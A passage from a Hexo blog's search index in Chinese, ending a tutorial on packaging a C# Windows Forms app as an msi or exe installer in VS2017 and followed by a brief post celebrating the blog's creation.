src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-17.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-17.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-17.png" style="zoom:50%;" /><ul><li>添加菜单快捷启动图标和桌面快捷启动图标，与以上面步骤类似</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-21.png" style="zoom:50%;" /><ul><li>设置客户端安装包的一些属性 （这里就自己百度设置什么</li><li>）</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-22.png" style="zoom:50%;" /><ul><li>设置安装需求环境</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-23.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-24.png" style="zoom:50%;" /><ul><li>右键WindowsSetup –&gt; 生成，找到WindowsSetup/Debug目录可以看到输出的msi和exe文件</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-25.png" style="zoom:50%;" /><ul><li>双击即可安装</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-26.png" style="zoom:50%;" /><ul><li>参考原文链接：<a href="https://blog.csdn.net/qq_39170782/article/details/99824171" target="_blank" rel="noopener">https://blog.csdn.net/qq_39170782/article/details/99824171</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My_Blog&#39;s Birthday</title>
      <link href="/2020/01/08/My_Blog&#39;s%20Birthday/"/>
      <url>/2020/01/08/My_Blog&#39;s%20Birthday/</url>
      
        <content type="html"><![CDATA[<p>好了，这篇文章来以纪念我的博客的诞生** </p><p><img src="https://i.loli.net/2020/03/27/Lh9S871WFQoiKtm.jpg" alt=""></p><p>**                                                                                                                           ———–2020-1-8**</p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
